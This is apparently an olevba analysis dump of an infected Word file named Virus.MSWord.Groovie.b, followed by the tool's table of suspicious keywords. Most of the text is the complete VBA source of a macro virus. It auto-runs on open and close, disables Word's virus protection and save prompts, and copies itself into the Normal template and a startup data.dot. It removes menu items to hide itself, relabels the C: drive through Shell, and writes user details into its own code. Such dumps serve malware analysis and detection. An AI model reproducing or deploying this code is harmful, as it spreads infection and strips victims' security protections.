olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-b9fbb013e7dc57015b8dba91b7df604fbfe168f6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-b9fbb013e7dc57015b8dba91b7df604fbfe168f6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO prakash.bas 
in file: Virus.MSWord.Groovie.b-b9fbb013e7dc57015b8dba91b7df604fbfe168f6 - OLE stream: 'Macros/VBA/prakash'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
Public I02 As Boolean
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
Public I03 As Boolean
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
Public I04 As Boolean
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
Public I05 As Boolean
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
Public I06 As String
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
Public I07 As Boolean
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
Public I08 As Boolean
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
Function I09()
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
    If MacroContainer = NormalTemplate Then
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
        I01 = "normal"
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
        GoTo checkout
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
    End If
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' *6/11/99 11:44:34 PM900*900HP DeskJet 520 Printer on FILE:
checkout:
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Function I10()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        If ActiveDocument.VBProject.VBComponents(I).Name = "prakash" Then I04 = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    Next I
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        If NormalTemplate.VBProject.VBComponents(I).Name = "prakash" Then I03 = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    Next I
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Function I11()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I09
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I10
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I01 = "document" Then Call I12
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I01 = "normal" Then Call I13
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I01 = "orbit" Then Call I14
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Function I12()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    Application.VBE.ActiveVBProject.VBComponents("prakash").Export "c:\prakash.sys"
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I03 = False And I05 = False Then
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        With NormalTemplate.VBProject
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        With .VBComponents.Import("c:\prakash.sys")
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    End If
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I02 = False Then
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="prakash", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        If I08 = False Then Documents.Open FileName:=I06
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        Shell ("label c: prakash"), 0
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        Windows(1).Close
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    End If
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Function I13()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Application.ScreenUpdating = False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    Call I17
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I04 = False And I07 = True Then
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        With ActiveDocument.VBProject
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        With .VBComponents.Import("c:\prakash.sys")
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        With Dialogs(wdDialogFileSummaryInfo)
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            .Comments = "ALT-F11 says it's prakash!"
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            .Execute
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    End If
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I02 = False And I07 = True Then
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="prakash", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        If I08 = False Then Documents.Open FileName:=I06
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    End If
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If I02 = False And I07 = False Then
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        Documents.Add Template:="", NewTemplate:=False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="prakash", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    End If
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Application.ScreenUpdating = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Function I14()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Application.ScreenUpdating = False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        If I03 = False And I05 = False Then
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            With NormalTemplate.VBProject
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            With .VBComponents.Import("c:\prakash.sys")
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            NormalTemplate.Save
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        End If
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        If I04 = False Then
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            With ActiveDocument.VBProject
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            With .VBComponents.Import("c:\prakash.sys")
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            With Dialogs(wdDialogFileSummaryInfo)
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
                .Comments = "ALT-F11 says it's prakash!"
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
                .Execute
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
            End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        End If
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Application.ScreenUpdating = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Function I15()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    Options.VirusProtection = False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    Options.SaveNormalPrompt = False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    Options.ConfirmConversions = False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    I06 = ActiveDocument.FullName
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    Call I11
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub AutoOpen()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I15
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub AutoClose()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
I08 = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I15
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub AutoExit()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I15
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub FileSaveAs()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I16
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I15
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Dialogs(wdDialogFileSaveAs).Show
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub filesave()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I16
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I15
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub fileclose()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
I08 = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I15
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
ActiveDocument.Close
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub fileprint()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error Resume Next
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Call I15
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Dialogs(wdDialogFilePrint).Show
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub ViewVBCode()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub ToolsMacro()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Sub FileTemplates()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Sub
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Function I17()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
On Error GoTo docek
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    If ActiveDocument.Name <> "" Then
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
        I07 = True
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    End If
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    GoTo over
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
docek:
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
    I07 = False
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
over:
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Function I16()
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Randomize
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
rn = Int(Rnd * 999)
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
For x = 2 To 358 Step 2
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
.deletelines x
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
Next x
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End With
 ' *6/11/99 11:44:35 PM900*900HP DeskJet 520 Printer on FILE:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
